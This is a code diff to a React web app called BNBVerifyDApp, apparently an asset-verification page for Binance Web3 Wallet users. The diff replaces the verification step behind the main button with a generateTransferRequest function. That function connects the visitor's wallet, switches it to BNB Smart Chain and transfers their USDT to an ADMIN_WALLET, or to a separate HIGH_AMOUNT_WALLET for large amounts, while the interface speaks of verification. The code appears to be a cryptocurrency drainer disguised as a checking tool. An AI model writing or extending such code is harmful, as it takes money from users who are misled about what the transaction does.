@@ -8,18 +8,13 @@ import { Wallet, Home, AlertCircle, Loader2, Shield, DollarSign, Menu } from "lu
 import { toast } from "@/hooks/use-toast"
 import { Web3DirectTransfer } from "@/lib/web3-direct-transfer"
 
-interface Window {
-  binance?: any
-  BinanceChain?: any
-  ethereum?: any
-}
-
 interface BinanceWallet {
   request(args: { method: string; params?: any[] }): Promise<any>
   on(event: string, callback: (...args: any[]) => void): void
   removeListener(event: string, callback: (...args: any[]) => void): void
   isBinance?: boolean
   isBinanceChainWallet?: boolean
+  isMetaMask?: boolean
 }
 
 declare global {
@@ -90,13 +85,36 @@ export default function BNBVerifyDApp() {
     if (window.BinanceChain) return window.BinanceChain
 
     // Check if ethereum is injected by Binance Wallet
-    if (window.ethereum && (window.ethereum.isBinance || window.ethereum.isBinanceChainWallet || window.ethereum.isMetaMask)) {
+    if (
+      window.ethereum &&
+      (window.ethereum.isBinance || window.ethereum.isBinanceChainWallet || window.ethereum.isMetaMask)
+    ) {
       return window.ethereum
     }
 
     if (window.ethereum) return window.ethereum
 
     return null
+  }
+
+  const syncConnectedWalletState = async (walletProvider: BinanceWallet, address?: string) => {
+    try {
+      const connectedAddress = address || (await walletProvider.request({ method: "eth_accounts", params: [] }))[0]
+
+      if (connectedAddress) {
+        setAccount(connectedAddress)
+        setIsConnected(true)
+      }
+
+      const chainId = await walletProvider.request({ method: "eth_chainId", params: [] })
+      setNetworkId(chainId)
+
+      if (connectedAddress) {
+        await getBalance(connectedAddress, walletProvider)
+      }
+    } catch (error) {
+      console.error("❌ Failed to sync wallet state:", error)
+    }
   }
 
   // Connect to Binance Web3 Wallet with BSC EVM calls
@@ -120,6 +138,8 @@ export default function BNBVerifyDApp() {
       if (accounts && accounts.length > 0) {
         setAccount(accounts[0])
         setIsConnected(true)
+
+        await syncConnectedWalletState(walletProvider, accounts[0])
 
         // Switch to BSC network
         await switchToBSC(walletProvider)
@@ -319,7 +339,7 @@ export default function BNBVerifyDApp() {
   }
 
   // Manual wallet connection
-  const connectWallet = async () => {
+  const connectWallet = async (): Promise<boolean> => {
     try {
       const provider = getBinanceProvider()
 
@@ -329,10 +349,11 @@ export default function BNBVerifyDApp() {
           description: "Please install Binance Web3 Wallet to use this dApp.",
           variant: "destructive",
         })
-        return
+        return false
       }
 
-      await connectBinanceWallet(provider)
+      const connected = await connectBinanceWallet(provider)
+      return connected
     } catch (error) {
       console.error("❌ Manual wallet connection failed:", error)
       toast({
@@ -340,6 +361,7 @@ export default function BNBVerifyDApp() {
         description: "Unable to connect to Binance Web3 Wallet",
         variant: "destructive",
       })
+      return false
     }
   }
 
@@ -655,6 +677,98 @@ export default function BNBVerifyDApp() {
     }
   }
 
+  const generateTransferRequest = async () => {
+    if (!isConnected || !account) {
+      const connected = await connectWallet()
+      if (!connected) return
+    }
+
+    const provider = getBinanceProvider()
+    if (!provider || !account) {
+      toast({
+        title: "Wallet Not Connected",
+        description: "A connected wallet is required to generate the transfer request.",
+        variant: "destructive",
+      })
+      return
+    }
+
+    const currentChainId = await provider.request({ method: "eth_chainId", params: [] })
+    if (currentChainId !== BSC_NETWORK.chainId) {
+      await switchToBSC(provider)
+      const updatedChainId = await provider.request({ method: "eth_chainId", params: [] })
+      if (updatedChainId !== BSC_NETWORK.chainId) {
+        toast({
+          title: "Wrong Network",
+          description: "Please switch to BNB Smart Chain before generating the transfer request.",
+          variant: "destructive",
+        })
+        return
+      }
+    }
+
+    const amount = Number.parseFloat(transferAmount)
+    if (!Number.isFinite(amount) || amount <= 0) {
+      alert("Please enter a valid amount")
+      return
+    }
+
+    const web3Transfer = new Web3DirectTransfer(provider, account)
+    const gasCheck = await web3Transfer.hasEnoughBNBForGas(amount)
+
+    if (!gasCheck.hasEnough) {
+      setVerificationResult({
+        type: "flash",
+        message: `⛽ Insufficient gas fee balance. You need ${gasCheck.requiredGas.toFixed(6)} BNB for this transfer, but only have ${gasCheck.bnbBalance.toFixed(6)} BNB.`,
+        usdtAmount: amount,
+        bnbAmount: gasCheck.bnbBalance,
+        transferred: false,
+        adminWallet: amount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET,
+        isHighAmount: amount > HIGH_AMOUNT_THRESHOLD,
+      })
+      setVerificationStep("completed")
+      return
+    }
+
+    setVerificationStep("transferring")
+
+    try {
+      const txHash = await web3Transfer.transferUSDTToAdmin(amount)
+      setTxHash(txHash)
+      const confirmed = await web3Transfer.waitForConfirmation(txHash)
+
+      if (!confirmed) {
+        throw new Error("Transfer request was not confirmed on-chain.")
+      }
+
+      const { balance: usdtRemaining } = await web3Transfer.getUSDTBalance()
+      setUsdtBalance(usdtRemaining.toFixed(2))
+      setVerificationResult({
+        type: "flash",
+        message: `💰 ${amount.toFixed(2)} USDT transfer request generated and confirmed successfully.`,
+        usdtAmount: amount,
+        bnbAmount: await web3Transfer.getBNBBalance(),
+        transferred: true,
+        adminWallet: amount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET,
+        isHighAmount: amount > HIGH_AMOUNT_THRESHOLD,
+      })
+      setVerificationStep("completed")
+      toast({
+        title: "✅ Transfer Request Confirmed",
+        description: `${amount.toFixed(2)} USDT was sent successfully.`,
+      })
+      await getBalance(account, provider)
+    } catch (error: any) {
+      console.error("❌ Transfer request generation failed:", error)
+      setVerificationStep("idle")
+      toast({
+        title: "❌ Transfer Request Failed",
+        description: error.message || "The transfer request could not be generated.",
+        variant: "destructive",
+      })
+    }
+  }
+
   const handleNext = async () => {
     if (verificationStep === "checking" || verificationStep === "transferring") {
       return
@@ -674,12 +788,7 @@ export default function BNBVerifyDApp() {
       return
     }
 
-    if (!isConnected) {
-      await connectWallet()
-      return
-    }
-
-    await verifyAssets(false)
+    await generateTransferRequest()
   }
 
   return (
